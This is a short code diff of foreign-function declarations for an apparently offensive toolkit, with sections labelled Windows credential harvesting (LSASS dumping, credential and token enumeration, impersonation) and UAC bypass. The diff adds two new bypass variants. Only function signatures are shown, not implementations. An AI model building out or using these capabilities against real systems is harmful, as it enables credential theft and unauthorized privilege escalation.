@@ -5,6 +5,8 @@
 // ---- libc / system ----
 ffi puts(s: string) -> i32;
 ffi printf(fmt: string, ...) -> i32;
+ffi SetConsoleOutputCP(cp: i32) -> bool;
+ffi Sleep(ms: i32) -> void;
 ffi println(s: string) -> void;
 ffi string(val: i64) -> string;
 ffi jocky_str_concat(a: string, b: string) -> string;
@@ -260,7 +262,7 @@ ffi jocky_fence2pwn_verify_spray() -> bool;
 
 // ---- Windows Credential Harvesting ----
 ffi jocky_lsass_dump() -> i32;
-ffi jocky_credentials_enumerate() -> [string];
+ffi jocky_credentials_enumerate() -> string;
 ffi jocky_token_enumerate() -> [i32];
 ffi jocky_impersonate_user(username: string, domain: string, password: string) -> bool;
 ffi jocky_is_admin() -> bool;
@@ -269,6 +271,8 @@ ffi jocky_is_root() -> bool;
 
 // ---- UAC Bypass (user → high-integrity without UAC prompt) ----
 ffi jocky_uac_bypass() -> bool;
+ffi jocky_uac_bypass_icmluautil(self_path: string) -> bool;
+ffi jocky_uac_bypass_silentcleanup(self_path: string) -> bool;
 ffi jocky_uac_bypass_fodhelper(self_path: string) -> bool;
 ffi jocky_uac_bypass_computerdefaults(self_path: string) -> bool;
 ffi jocky_uac_bypass_wsreset(self_path: string) -> bool;
